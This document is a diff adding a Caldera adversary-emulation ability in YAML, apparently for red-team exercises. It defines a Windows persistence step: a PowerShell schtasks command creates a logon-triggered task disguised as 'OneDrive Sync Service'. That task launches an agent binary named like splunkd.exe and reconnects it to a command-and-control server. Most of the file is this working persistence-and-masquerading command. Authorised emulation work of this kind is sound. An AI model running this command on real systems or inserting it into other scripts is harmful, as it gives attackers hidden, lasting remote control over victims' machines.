@@ -1,0 +1,23 @@
+- id: 7d2d7e30-1a73-45d5-8a24-943a41c6999a
+  name: Scheduled Task Persistence (User Logon)
+  description: Creates a scheduled task to re-establish C2 by executing the existing agent executable every time the user logs on. Masquerades as a common cloud sync application. Relies on a correctly configured C2 server address in Caldera.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        # NOTE: This command relies on the '#{server}' and '#{group}' global variables.
+        # The '#{server}' variable is populated from the 'app.contact.http' setting in Caldera's config file.
+        # This MUST be set to a reachable IP for the agent to connect.
+        command: |
+          $agentExe = "C:\Users\Public\splunkd.exe";
+          $agentCmd = "-server #{server} -group #{group} -v";
+          schtasks /create /tn "OneDrive Sync Service" /tr "$($agentExe) $($agentCmd)" /sc onlogon /f;
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'host.persistence.scheduled_task'
+              custom_parser_vals:
+                regex: 'SUCCESS: The scheduled task "(.+)" has successfully been created.'
+                edge_label: 'has_persistence_method'
